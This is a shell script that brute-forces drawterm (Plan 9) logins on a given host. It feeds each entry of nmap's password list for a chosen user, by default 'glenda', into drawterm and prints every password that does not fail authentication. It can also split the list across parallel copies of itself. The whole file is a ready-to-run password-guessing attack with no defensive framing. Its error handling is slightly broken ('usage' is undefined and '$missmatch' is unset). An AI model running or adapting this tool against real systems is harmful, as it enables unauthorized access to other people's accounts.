#!/bin/sh
# This is pointless. Threading doesnt save a large amount of time.

thread=1
user="glenda"
passwords_file="/usr/share/nmap/nselib/data/passwords.lst"
host=""
error=""

while :
do
    case "$1" in
	-t) shift; thread="$1";;
	-u) shift; user="$1";;
	-p) shift; passwords_file="$1";;
	-h) shift; host="$1";;
	--) shift; break;;
	-*) usage "bad argument $1";;
	*) break;;
    esac
    shift
done

process_file()
{
   for password in `cat $passwords_file | grep -v '^#!comment'`
   do
      cmdReturn=`echo $password | /opt/drawterm/drawterm -h $host -a $host -u $user -G -c pwd`

      if [ `echo $cmdReturn | grep 'Connection refused' | wc -l` -eq 1 ]
      then
         error=$missmatch
         break
      fi

      # | grep "cannot read authenticator" | wc -l
      if [ `echo $cmdReturn | grep 'cannot read authenticator' | wc -l` -eq 0 ]
      then
         echo "Match: $password"
         #echo "Return $cmdReturn"
      fi
   done
}

# Split file into $thread, and run w
split_file_and_run()
{
   basename=`basename $0`

   # Clean out old files
   for i in `seq 1 $thread`; do
       rm /tmp/${basename}_`expr $i - 1` 2>/dev/null
   done

   # Split password files
   count=0
   for password in `cat $passwords_file`; do
      file_num=`expr $count % $thread`
      echo $password >> /tmp/${basename}_${file_num}
      count=`expr $count + 1`
   done

   # Run self with &.
   for i in `seq 1 $thread`; do
      echo "$0 -t 1 -u $user -h $host -p /tmp/${basename}_`expr $i - 1` &"
      $0 -t 1 -u $user -h $host -p /tmp/${basename}_`expr $i - 1` &
   done

   # Wait for process to return
   while true; do
      sleep 1
      procCount=`ps -ef | grep -v grep | grep $basename | wc -l`
      if [ $procCount -le 2 ]; then
         break
      fi
   done

   # Clean out temp files.
   for i in `seq 1 $thread`; do
       rm /tmp/${basename}_`expr $i - 1` 2>/dev/null
   done
}

if [ $thread -eq 1 ]; then
   process_file
else
   split_file_and_run
fi

if [ $error ]; then
   echo $error
fi
